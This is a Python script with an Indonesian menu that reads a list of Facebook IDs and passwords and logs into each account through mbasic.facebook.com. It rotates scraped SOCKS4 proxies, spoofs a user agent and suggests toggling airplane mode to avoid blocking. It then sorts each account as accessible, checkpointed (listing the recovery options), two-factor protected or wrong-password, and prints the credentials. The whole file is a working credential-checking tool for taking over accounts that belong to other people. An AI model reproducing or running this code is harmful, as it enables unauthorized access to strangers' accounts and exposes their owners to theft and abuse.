import requests,re,bs4,sys,os,time,random
session = requests.Session()
from bs4 import BeautifulSoup as sop
J = '\x1b[38;5;208m'
hh = '\033[32m' # HIJAU -
k = '\033[93m'
opsi,pro = [],[]
P = "\033[0m"
try:ua = open('.usergetbas.txt','r').read()
except:ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"


def hilang():
	os.system('clear')
def logo():
	print(f"""          __           __              
     ____/ /  ___ ____/ /__            ┌──────────────────────────────┐  
    / __/ _ \/ -_) __/  '_/      __    │  {J}Script By RochmatBasukiXD {P}  │  
    \__/_//_/\__/\__/_/\_(_)__  / /_   │    {J}Github.com/RozhBasXYZ   {P}  │
              / _ \/ _ \/ / _ \/ __/   └──────────────────────────────┘
             / .__/\___/_/_//_/\__/    
            /_/                        \n\n""")
def menu():
	hilang()
	logo()
	print("1. cek opsi checkpoint\n2. setting user agent\n3. setting proxy\n4. cara memakai sc\n5. keluar")
	bas = input('menu : ')
	if bas in ['1']:
		main()
	elif bas in ['2']:
		userget()
	elif bas in ['3']:
		prox()
	elif bas in ['4']:
		info()
	else:
		exit()

def info():
	hilang()
	logo()
	print("""1. cek opsi checkpoint\n dalam menu ini ada 3 pertanyaan sebelum anda melakukan cek opsi\n - cara memasukan nama file adalah /sdcard/namafile\n   atau /sdcard/namafolder/namafile\n - pemisah file adalah pemisah di antara\n   user id dan sandi contoh (100002888888 • sandimu)\n   sebaiknya cek terlebih dahulu file anda memakai pemisah jenis apa\n\n2. setting user agent\n dalam menu ini ada dua pilihan cek user agent\n yang terpakai di dalam sc atau ganti user agent\n - cara ganti user agent sesuai merk hp anda adalah\n   dengan cara mencari di google (my user agent) lalu yang muncul\n   di bar pertama adalah user agent hp anda coopy dan masukan ke sc\n\n3. setting proxy\n dalam menu ini ada 2 pilihan\n - pilihan ke satu adalah memakai proxy indonesia\n - pilihan ke dua adalah memakai proxy luar negeri""")

def userget():
	to = input("1. cek user agent\n2. ganti user agent\nmenu : ")
	if to in ['1']:
		print("user agent : %s%s%s"%(hh,ua,P))
		exit()
	else:pass		
	print("anda bisa memakai user agent hp anda\natau user agent andalan anda")
	ugt = input('user agent : ')
	os.remove('.usergetbas.txt')
	open('.usergetbas.txt','w').write(ugt)
	exit("sukses setting user agent\nuser agent : %s%s%s"%(hh,ugt,P))

def prox():
	wow = input("1. random proxy indonesia\n2. random proxy luar negeri\nmenu : ")
	if wow in ['1']:
		sock = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=100000000&country=ID&ssl=ID&anonymity=ID').text
		open('.prox.txt','w').write(sock)
		print(sock,"\nberhasil setting proxy indonesia")
		exit()
	else:pass
	sock2 = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=100000000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(sock2)
	print(sock2,"\nberhasil setting proxy luar negeri")
	exit()

def main():
	ba = input("nama file : ")
	try:data = open(ba,"r").readlines()
	except FileNotFoundError:exit("file tidak ada")
	pm = input("pemisah file : ")
	proc = input("gunakan proxy (tidak rekomendasi)\nproxy [y/t] : ")
	if proc in ['y','Y']:
		pro.append("y")
	else:pass
	print(f"jumlah akun di file %s adalah %s"%(ba,len(data)))
	input(f"di anjutkan mode pesawat selama 3 detik, enter jika sudah.")
	babaz(pm,data)
	

def sesi(session,res):
	response = sop(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = sop(session.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi

def babaz(pm,data):
	lopi,slh,cp,tp = 0,0,0,0
	for user in data:
		try:
			prox = open('.prox.txt','r').read().splitlines()
			proxy = {'http': 'socks4://'+random.choice(prox)}
			try:idf,pw = user.split(f"{pm}")
			except:print(f"{k}pemisah file salah {user}\33[m");exit()			
			h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent':ua}
			res = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2,).text
			ress = sop(res, 'html.parser')
			form = ress.find('form',{'method':'post'})
			data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
			data2.update({
					'email':idf,
					'pass':pw})
			if 'y' in pro:
				res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,proxies=proxy,headers=h2).text
			else:pass
			res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
			ress = sop(res, 'html.parser')
			if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
				print(f"""\r{P}────────────────────            
\remail : {hh}{idf}{P}
\rsandi : {hh}{pw}{P}opsi  : {hh}akun tap yes{P}
\r────────────────────\n""")
				tp+=1
			elif 'Daftar Facebook' in str(ress.find('title').text):
				slh+=1
				print(f"""\r{P}────────────────────              
\remail : \033[93m{idf}{P}
\rsandi : \033[93m{pw}{P}opsi  : \033[93mkata sandi salah/terjadi kesalahan{P}
\r────────────────────\n""")
			else:
				if(len(sesi(session,res))==0):
					if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
						print(f"""\r{P}────────────────────           
\remail : \033[93m{idf}{P}
\rsandi : \033[93m{pw}{P}opsi  : \033[93mterpasang auten{P}
\r────────────────────\n""")
					elif 'c_user' in str(ress.find('title').text):
						if 'Akun Anda Dikunci' in str(ress.find('title').text):
							print(f"""\r{P}────────────────────           
\remail : \033[93m{idf}{P}
\rsandi : \033[93m{pw}{P}opsi  : \033[93makun sesi new{P}
\r────────────────────\n""")
						else:
							print(f"""\r{P}────────────────────          
\remail : {hh}{idf}{P}
\rsandi : {hh}{pw}{P}opsi  : {hh}akun tidak checkpoint{P}
\r────────────────────\n""")
				else:
					cp+=1
					print(f"""\r{P}────────────────────             
\remail : \033[93m{idf}{P}
\rsandi : \033[93m{pw}{P}opsi  : \033[93m%s
\r{P}────────────────────\n"""%('\n       '.join(opsi)))
			lopi+=1		
			opsi.clear()
			print("\r%s/%s - %s"%(lopi,len(data),idf),end=' ')
			sys.stdout.flush()
		except requests.exceptions.ConnectionError:
			pass
		except Exception as e:
			print(f"""\r{P}────────────────────
\remail : \033[93m{idf}{P}
\rsandi : \033[93m{pw}{P}opsi  : \033[93m{e}{P}
\r────────────────────\n""")
	print(f"\rproses cek selesai             \njumlah tap yes : %s\njumlah checkpoint : %s\njumlah salah sandi : %s"%(tp,cp,slh))
	exit()


if __name__=="__main__":
	os.system('git pull')
	os.system('clear')
	menu()